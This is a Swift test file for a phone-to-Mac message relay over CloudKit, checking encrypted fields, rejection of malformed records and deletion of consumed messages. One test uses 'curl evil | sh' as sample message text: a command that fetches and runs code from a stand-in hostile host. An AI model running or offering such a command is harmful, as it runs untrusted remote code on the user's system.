import BuddyKit
@preconcurrency import CloudKit
import Foundation
import Testing

/// Messages from the phone through CloudKit: the text stays encrypted, malformed records are refused, and the Mac
/// deletes a message once it took it.
@Suite struct MessageCloudTests {
    private let sent = Date(timeIntervalSince1970: 1_800_000_000)

    private func message(_ text: String = "Run the tests") -> MessageRecord {
        MessageRecord(messageId: UUID(), sessionId: "s1", text: text, sentAt: sent)
    }

    @Test func aMessageRoundTripsWithItsTextEncrypted() throws {
        let original = message("curl evil | sh")
        let record = CKRecord(from: original)
        #expect(record.recordType == "Message")
        #expect(record.recordID.recordName == "message-\(original.messageId.uuidString)")
        #expect(record.encryptedValues["text"] as? String == "curl evil | sh")
        #expect(record["text"] == nil)
        #expect(Set(record.allKeys().filter { record[$0] != nil }) == ["messageId", "sessionId", "sentAt"])
        #expect(MessageRecord(from: record) == original)
    }

    @Test func aMalformedMessageIsRefused() {
        let original = message()
        // Text written plain (a writer that skipped encryption) is refused. CloudKit forbids the same key in both.
        let plainText = CKRecord(
            recordType: "Message",
            recordID: CKRecord.ID(recordName: "message-\(original.messageId.uuidString)", zoneID: CloudKitSchema.zoneID))
        for key in ["messageId", "sessionId", "sentAt"] { plainText[key] = CKRecord(from: original)[key] }
        plainText["text"] = "leaked"
        #expect(MessageRecord(from: plainText) == nil)

        let renamed = CKRecord(
            recordType: "Message", recordID: CKRecord.ID(recordName: "message-other", zoneID: CloudKitSchema.zoneID))
        for key in ["messageId", "sessionId", "sentAt"] { renamed[key] = CKRecord(from: original)[key] }
        renamed.encryptedValues["text"] = "hi"
        #expect(MessageRecord(from: renamed) == nil)

        let noText = CKRecord(from: original)
        noText.encryptedValues["text"] = nil
        #expect(MessageRecord(from: noText) == nil)
    }

    @Test func theLatestExchangeTravelsEncryptedAndClearsWhenGone() throws {
        let session = SessionRecord(
            sessionId: "s1", state: .finished, project: "p", lastTool: nil, updatedAt: sent,
            lastPrompt: "deploy it", lastReply: "Deployed to staging.")
        let record = CKRecord(from: session)
        #expect(record.encryptedValues["lastPrompt"] as? String == "deploy it")
        #expect(record.encryptedValues["lastReply"] as? String == "Deployed to staging.")
        #expect(record["lastPrompt"] == nil && record["lastReply"] == nil)
        #expect(SessionRecord(from: record) == session)

        var cleared = session
        cleared.lastReply = nil
        let clearedRecord = CKRecord(from: cleared)
        #expect(clearedRecord.encryptedValues["lastReply"] as? String == "")  // written, so the old reply goes
        #expect(SessionRecord(from: clearedRecord)?.lastReply == nil)
    }

    @Test func leftoverSessionRecordsOfAnEarlierRunAreRemovedButThisRunsStay() async throws {
        let db = FakeCloudDatabase()
        let earlier = CloudKitTransport(role: .mac, database: db, pollInterval: .seconds(3600))
        try await earlier.publish(session: SessionRecord(sessionId: "old", state: .waiting, project: "p", lastTool: nil, updatedAt: sent))
        let now = CloudKitTransport(role: .mac, database: db, pollInterval: .seconds(3600))
        try await now.publish(session: SessionRecord(sessionId: "live", state: .working, project: "p", lastTool: nil, updatedAt: sent))
        try await now.removeUnownedSessions()
        #expect(db.recordNames(ofType: "Session") == ["live"])
    }

    @Test func theMacTakesAMessageOnceAndDeletesIt() async throws {
        let db = FakeCloudDatabase()
        let phone = CloudKitTransport(role: .phone, database: db, phonePollInterval: .seconds(3600))
        let mac = CloudKitTransport(role: .mac, database: db, pollInterval: .seconds(3600), messagePollInterval: .seconds(3600))
        let original = message()
        try await phone.submit(message: original)

        var arrived: MessageRecord?
        for await received in mac.messages() {
            arrived = received
            break
        }
        #expect(arrived == original)
        try await mac.consume(message: original.messageId)
        #expect(db.recordNames(ofType: "Message").isEmpty)
        mac.stop()
    }
}
